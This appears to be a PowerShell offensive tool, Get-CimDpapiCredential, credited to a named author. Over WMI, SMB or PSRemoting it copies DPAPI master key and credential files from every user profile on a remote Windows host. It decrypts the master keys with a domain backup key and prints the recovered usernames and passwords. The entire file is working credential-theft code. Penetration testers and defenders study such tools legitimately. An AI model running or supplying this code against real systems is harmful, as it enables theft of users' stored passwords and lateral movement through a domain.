#requires -version 3

Function Get-CimDpapiCredential {
<#
.SYNOPSIS
    Grab DPAPI credential blobs and decrypt them.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CimDpapiCredential gathers DPAPI master key files and credential files on a remote host through WMI.
    From local copies, it decrypts reachable DPAPI master keys of domain users using the supplied domain backup key.
    Finally, it attempts to decrypt DPAPI credential blobs.
    The decryption part is highly inspired from SharpDPAPI (by @harmj0y).

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Authentication
    Specifies what authentication method should be used.

.PARAMETER Protocol
    Specifies the protocol to use, defaults to DCOM.

.PARAMETER BackupKeyFile
    Specifies the DPAPI domain private key file used to decrypt reachable user masterkeys.

.EXAMPLE
    PS C:\> Get-CimDpapiCredential -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -BackupKeyFile .\domain_backup.pvk
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
        [String]
        $Authentication = 'Default',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $BackupKeyFile
    )

    BEGIN {
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            break
        }

        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        try {
            if (-not $PSBoundParameters['ComputerName']) {
                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if (($DpapiKeyFile -or $DpapiPassword) -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            elseif ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if (($DpapiKeyFile -or $DpapiPassword) -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if (($DpapiKeyFile -or $DpapiPassword) -and $Protocol -eq 'Wsman') {
                    $psSession = New-PSSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
        }
        catch [Management.Automation.PSArgumentOutOfRangeException] {
            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
            break
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
                break
            }
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Verbose "[$ComputerName] Access denied."
                break
            }
            else {
                Write-Verbose "[$ComputerName] Failed to establish CIM session."
                break
            }
        }
        catch [Management.Automation.Remoting.PSRemotingTransportException] {
            Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
            break
        }

        $formatDefaultLimit = $global:FormatEnumerationLimit
        $global:FormatEnumerationLimit = -1 # Prevent output truncation
    }

    PROCESS {
        $backupKeyBytes = [IO.File]::ReadAllBytes($BackupKeyFile)

        # Triage user credentials
        $masterKeyFilePath = "\AppData\Roaming\Microsoft\Protect\"
        $credentialFilePaths = @(
            "\AppData\Local\Microsoft\Credentials\"
            "\AppData\Roaming\Microsoft\Credentials\"
        )
        Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
            # Get user master key files
            $masterKeys = @{}
            $masterKeyFiles = Get-CimDirectory -Path ($_.LocalPath + $masterKeyFilePath) -Recurse -CimSession $cimSession | Where-Object {$_.CimClass.CimClassName -eq 'CIM_DataFile'}
            foreach ($masterKeyFile in $masterKeyFiles) {
                if ([Regex]::IsMatch($masterKeyFile.FileName, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$")) {
                    # Copy user master key file locally
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $_.LocalPath -split "\\"
                    $outputFile = "$outputDir\$($temp.get($temp.Count - 1))_$($masterKeyFile.FileName).$($masterKeyFile.Extension)"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($psSession) {
                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
                    }
                    else {
                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                    }

                    # Decrypt user master key using provided backup key
                    $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
                    if ($plaintextMasterKey = Decrypt-MasterKey -MasterKeyBytes $masterKeyBytes -BackupKeyBytes $backupKeyBytes) {
                        $masterKeys += $plaintextMasterKey
                    }
                }
            }

            # Get user credential files
            foreach ($credentialFilePath in $credentialFilePaths) {
                $credentialFiles = Get-CimDirectory -Path ($_.LocalPath + $credentialFilePath) -CimSession $cimSession | Where-Object {$_.CimClass.CimClassName -eq 'CIM_DataFile'}
                foreach ($credentialFile in $credentialFiles) {
                    # Copy user credential file locally
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $_.LocalPath -split "\\"
                    $outputFile = "$outputDir\$($temp.get($temp.Count - 1))_$($credentialFile.FileName).$($credentialFile.Extension)"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($psSession) {
                        Get-RemoteFile -Path $credentialFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
                    }
                    else {
                        Get-RemoteFile -Path $credentialFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                    }

                    # Decrypt credential blob using available master keys
                    $credentialBytes = [IO.File]::ReadAllBytes($outputFile)
                    if ($plaintextBytes = Decrypt-DpapiCredential -BlobBytes $credentialBytes -MasterKeys $masterKeys) {
                        $cred = Get-CredentialBlob -DecBlobBytes $plaintextBytes
                        $result = New-Object -TypeName PSObject
                        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $credentialFile.Name
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $cred
                        $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $credentialFile.CreationDate
                        $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $credentialFile.LastModified
                        Write-Output $result
                    }
                }
            }
        }
    }

    END {
        Remove-CimSession -CimSession $cimSession
        if ($psSession) {
            Remove-PSSession -Session $psSession
        }

        $global:FormatEnumerationLimit = $formatDefaultLimit
    }
}

Function Local:Get-CimDirectory {
    [CmdletBinding()]
    Param (
        [ValidateNotNullorEmpty()]
        [String]
        $Path = ".",

        [Switch]
        $Recurse,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Microsoft.Management.Infrastructure.CimSession]
        $CimSession
    )

    Begin {
        if ($path -match '\\$') {
            # Strip off a trailing slash
            $path = $path -replace "\\$", ""
        }
        $cimParams = @{
            ClassName  = "Win32_Directory"
            Filter     = "Name='$($path.replace("\", "\\"))'"
            CimSession = $CimSession
            Verbose    = $false
        }
    }

    Process {
        $currentDir = Get-CimInstance @cimParams

        # Enumerate files
        $currentDir | Get-CimAssociatedInstance -ResultClassName CIM_DataFile -Verbose:$false

        # Enumerate directories
        $subDir = $currentDir | Get-CimAssociatedInstance -ResultClassName Win32_Directory -Verbose:$false |
            Where-Object { (Split-Path $_.Name) -eq $currentDir.Name } # Filter out the parent folder
        $subDir

        if ($Recurse -and $subDir) {
            foreach ($directory in $subDir) {
                Get-CimDirectory -Path $directory.Name -Recurse -CimSession $cimSession
            }
        }
    }

    End {}
}

Function Local:Get-RemoteFile {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $Path,

        [Parameter(Mandatory = $True)]
        [String]
        $Destination,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.Automation.Runspaces.PSSession]
        $PSSession
    )

    BEGIN {
        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
            $stringBuilder = New-Object System.Text.StringBuilder 
            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
                [Void]$stringBuilder.Append($_.ToString("x2")) 
            } 
            return $stringBuilder.ToString() 
        }
    }

    PROCESS {
        if ($PSSession) {
            # Download file via PSRemoting
            Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
        }
        else {
            # Download file via SMB
            $fileDrive = ($Path -split ':').Get(0)
            $filePath = ($Path -split ':').Get(1)
            if ($Credential.Username) {
                $drive = Get-StringHash $ComputerName
                New-PSDrive -Name $drive -Root "\\$ComputerName\$fileDrive`$" -PSProvider "FileSystem" -Credential $Credential | Out-Null
                Copy-Item -Path "${drive}:$filePath" -Destination $Destination -Recurse
                Remove-PSDrive $drive
            }
            else {
                Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
            }
        }
    }

    END {}
}

Function Local:Decrypt-MasterKey {
    [CmdletBinding()]
    Param (
        [byte[]]
        $MasterKeyBytes,

        [byte[]]
        $BackupKeyBytes
    )

    $guidMasterKey = [Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72)

    # Get the domain key
    $offset = 96
    $masterKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    $offset += 8
    $backupKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    $offset += 8
    $credHistLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    $offset += 8
    $domainKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    if ($domainKeyLen -eq 0) {
        return
    }
    $offset += 8
    $offset += [int] ($masterKeyLen + $backupKeyLen + $credHistLen)
    $domainKeyBytes = New-Object byte[] $domainKeyLen
    [Array]::Copy($MasterKeyBytes, $offset, $domainKeyBytes, 0, $domainKeyLen)
    $offset = 4
    $secretLen = [BitConverter]::ToInt32($domainKeyBytes, $offset)
    $offset += 4
    $accesscheckLen = [BitConverter]::ToInt32($domainKeyBytes, $offset)
    $offset += 4
    $offset += 16
    $secretBytes = New-Object byte[] $secretLen
    [Array]::Copy($domainKeyBytes, $offset, $secretBytes, 0, $secretLen)
    $offset += $secretLen
    $accesscheckBytes = New-Object byte[] $accesscheckLen
    [Array]::Copy($domainKeyBytes, $offset, $accesscheckBytes, 0, $accesscheckLen)

    # Extract out the RSA private key
    $rsaPriv = New-Object byte[] ($BackupKeyBytes.Length - 24)
    [Array]::Copy($BackupKeyBytes, 24, $rsaPriv, 0, $rsaPriv.Length)
    $a = [BitConverter]::ToString($rsaPriv).Replace("-", "")
    $sec = [BitConverter]::ToString($secretBytes).Replace("-", "")

    # Decrypt the domain key
    $cspParameters = New-Object Security.Cryptography.CspParameters 24
    $rsaProvider = New-Object Security.Cryptography.RSACryptoServiceProvider $cspParameters
    try {
        $rsaProvider.PersistKeyInCsp = $false
        $rsaProvider.ImportCspBlob($rsaPriv)
        $secretBytesRev = New-Object byte[] 256
        [Buffer]::BlockCopy($secretBytes, 0, $secretBytesRev, 0, $secretBytes.Length)
        [Array]::Reverse($secretBytesRev)
        $domainKeyBytesDec = $rsaProvider.Decrypt($secretBytesRev, $false)
    }
    catch {
        Write-Verbose "Error while decrypting domain key: $_"
    }
    finally {
        $rsaProvider.PersistKeyInCsp = $false
        $rsaProvider.Clear()
    }

    $masterKeyLen = [BitConverter]::ToInt32($domainKeyBytesDec, 0)
    $suppKeyLen = [BitConverter]::ToInt32($domainKeyBytesDec, 4)

    $masterKey = New-Object byte[] $masterKeyLen
    [Buffer]::BlockCopy($domainKeyBytesDec, 8, $masterKey, 0, $masterKeyLen)
    $sha1 = New-Object Security.Cryptography.SHA1Managed
    $masterKeySha1 = $sha1.ComputeHash($masterKey)
    $masterKeySha1Hex = [BitConverter]::ToString($masterKeySha1).Replace("-", "")

    return @{$guidMasterKey=$masterKeySha1Hex}
}

Function Local:Decrypt-DpapiCredential {
    [CmdletBinding()]
    Param (
        [byte[]]
        $BlobBytes,

        [hashtable]
        $MasterKeys
    )

    $offset = 36
    $guidMasterKeyBytes = New-Object byte[] 16
    [Array]::Copy($BlobBytes, $offset, $guidMasterKeyBytes, 0, 16)
    $guidMasterKey = New-Object Guid @(,$guidMasterKeyBytes)
    $guidString = [string] $guidMasterKey
    Write-Verbose "guidMasterKey: $guidString"
    Write-Verbose "size: $($BlobBytes.Length)"
    $offset += 16
    $flags = [BitConverter]::ToUInt32($BlobBytes, $offset)
    Write-Verbose "flags: 0x$($flags.ToString("X"))"
    $offset += 4
    $descLength = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    $description = [Text.Encoding]::Unicode.GetString($BlobBytes, $offset, $descLength)
    $offset += $descLength
    $algCrypt = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    $algCryptLen = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    $saltLen = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    $saltBytes = New-Object byte[] $saltLen
    [Array]::Copy($BlobBytes, $offset, $saltBytes, 0, $saltLen)
    $offset += $saltLen
    $hmacKeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4 + $hmacKeyLen
    $algHash = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    Write-Verbose "algHash/algCrypt: $algHash/$algCrypt"
    Write-Verbose "description: $description"
    $algHashLen = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    $hmac2KeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4 + $hmac2KeyLen
    $dataLen = [BitConverter]::ToInt32($BlobBytes, $offset)
    $offset += 4
    $dataBytes = New-Object byte[] $dataLen
    [Array]::Copy($BlobBytes, $offset, $dataBytes, 0, $dataLen)

    if ($MasterKeys.ContainsKey($guidString)) {
        # If this key is present, decrypt this blob
        if ($algHash -eq 32782 -or $algHash -eq 32772) {
            # Convert hex string to byte array
            $keyBytes = [byte[]] -split ($MasterKeys[$guidString].ToString() -replace '..', '0x$& ')
            # Derive the session key
            $derivedKeyBytes = Get-DerivedKey -KeyBytes $keyBytes -SaltBytes $saltBytes -AlgHash $algHash
            $finalKeyBytes = New-Object byte[] ($algCryptLen / 8)
            [Array]::Copy($derivedKeyBytes, $finalKeyBytes, $algCryptLen / 8)
            # Decrypt the blob with the session key
            return (Decrypt-Blob -Ciphertext $DataBytes -Key $finalKeyBytes -AlgCrypt $algCrypt)
        }
        else {
            Write-Warning "Could not decrypt credential blob, unsupported hash algorithm: $algHash"
        }
    }
}

Function Local:Get-DerivedKey {
    [CmdletBinding()]
    Param (
        [byte[]]
        $KeyBytes,

        [byte[]]
        $SaltBytes,

        [int]
        $AlgHash
    )

    if ($algHash -eq 32782) { # CALG_SHA_512
        return New-Object Security.Cryptography.HMACSha512 @(, $keyBytes, $saltBytes)
    }
    elseif ($algHash -eq 32772) { # CALG_SHA1
        $ipad = New-Object byte[] 64
        $opad = New-Object byte[] 64
        for ($i = 0; $i -lt 64; $i++) {
            $ipad[$i] = [Convert]::ToByte(0x36) # '6'
            $opad[$i] = [Convert]::ToByte(0x5c) # '\'
        }
        for ($i = 0; $i -lt $keyBytes.Length; $i++) {
            $ipad[$i] = $ipad[$i] -bxor $keyBytes[$i]
            $opad[$i] = $opad[$i] -bxor $keyBytes[$i]
        }
        $bufferI = New-Object byte[] ($ipad.Length + $saltBytes.Length)
        [Buffer]::BlockCopy($ipad, 0, $bufferI, 0, $ipad.Length)
        [Buffer]::BlockCopy($saltBytes, 0, $bufferI, $ipad.Length, $saltBytes.Length)
        $sha1 = New-Object Security.Cryptography.SHA1Managed
        $sha1BufferI = $sha1.ComputeHash($bufferI)
        $bufferO = New-Object byte[] ($opad.Length + $sha1BufferI.Length)
        [Buffer]::BlockCopy($opad, 0, $bufferO, 0, $opad.Length)
        [Buffer]::BlockCopy($sha1BufferI, 0, $bufferO, $opad.Length, $sha1BufferI.Length)
        $sha1Buffer0 = $sha1.ComputeHash($bufferO)

        $ipad = New-Object byte[] 64
        $opad = New-Object byte[] 64
        for ($i = 0; $i -lt 64; $i++) {
            $ipad[$i] = [Convert]::ToByte(0x36) # '6'
            $opad[$i] = [Convert]::ToByte(0x5c) # '\'
        }
        for ($i = 0; $i -lt $sha1Buffer0.Length; $i++) {
            $ipad[$i] = $ipad[$i] -bxor $sha1Buffer0[$i]
            $opad[$i] = $opad[$i] -bxor $sha1Buffer0[$i]
        }
        $sha1 = New-Object Security.Cryptography.SHA1Managed
        $ipadSHA1bytes = $sha1.ComputeHash($ipad)
        $ppadSHA1bytes = $sha1.ComputeHash($opad)
        $ret = New-Object byte[] ($ipadSHA1bytes.Length + $ppadSHA1bytes.Length)
        [Buffer]::BlockCopy($ipadSHA1bytes, 0, $ret, 0, $ipadSHA1bytes.Length)
        [Buffer]::BlockCopy($ppadSHA1bytes, 0, $ret, $ipadSHA1bytes.Length, $ppadSHA1bytes.Length)
        return $ret
    }
    else {
        return
    }
}

Function Local:Decrypt-Blob {
    [CmdletBinding()]
    Param(
        [byte[]]
        $Ciphertext,

        [byte[]]
        $Key,

        [int]
        $AlgCrypt,

        [Security.Cryptography.PaddingMode]
        $padding = [Security.Cryptography.PaddingMode]::Zeros
    )

    $plaintextBytes = $null
    switch ($algCrypt) {
        26115 { # CALG_3DES
            # Decrypt the blob with 3DES
            $desCryptoProvider = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
            $ivBytes = New-Object byte[] 8
            $desCryptoProvider.Key = $key
            $desCryptoProvider.IV = $ivBytes
            $desCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
            $desCryptoProvider.Padding = $padding
            $plaintextBytes = $desCryptoProvider.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        }
        26128 { # CALG_AES_256
            # Decrypt the blob with AES256
            $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
            $ivBytes = New-Object byte[] 16
            $aesCryptoProvider.Key = $key
            $aesCryptoProvider.IV = $ivBytes
            $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
            $aesCryptoProvider.Padding = $padding
            $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        }
        default {
            Write-Warning "Could not decrypt credential blob, unsupported encryption algorithm: $algCrypt"
        }
    }
    return $plaintextBytes
}

Function Local:Get-CredentialBlob {
    [CmdletBinding()]
    Param (
        [byte[]]
        $DecBlobBytes
    )

    $offset = 0
    $credFlags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $credSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $credUnk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $type = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $flags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $lastWritten = [long] [BitConverter]::ToInt64($decBlobBytes, $offset)
    $offset += 8
    $lastWrittenTime = New-Object DateTime
    try {
        # Check that decrypytion worked correctly
        $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
    }
    catch {
        Write-Error "Credential blob decryption failed"
        return
    }

    $unkFlagsOrSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $persist = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $attributeCount = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $unk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $unk1 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $targetNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $targetName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetNameLen)
    $offset += $targetNameLen
    $targetAliasLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $targetAlias = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetAliasLen)
    $offset += $targetAliasLen
    $commentLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $comment = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $commentLen)
    $offset += $commentLen
    $unkDataLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $unkData = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $unkDataLen)
    $offset += $unkDataLen
    $userNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $userName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $userNameLen)
    $offset += $userNameLen
    $credBlobLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $credBlobBytes = New-Object byte[] $credBlobLen
    [Array]::Copy($decBlobBytes, $offset, $credBlobBytes, 0, $credBlobLen)
    $offset += $credBlobLen
    [int] $opt = 0xffff
    try {
        $credBlob = [Text.Encoding]::Unicode.GetString($credBlobBytes)
    }
    catch {
        $credBlob = [BitConverter]::ToString($credBlobBytes).Replace("-", " ")
    }
    $cred = [ordered]@{}
    $cred["UserName"] = $userName.Trim()
    $cred["Password"] = $credBlob.Trim()
    $cred["Data"] = $unkData.Trim()
    $cred["TargetName"] = $targetName.Trim()
    $cred["TargetAlias"] = $targetAlias.Trim()
    $cred["Comment"] = $comment.Trim()
    return (New-Object PSObject -Property $cred)
}
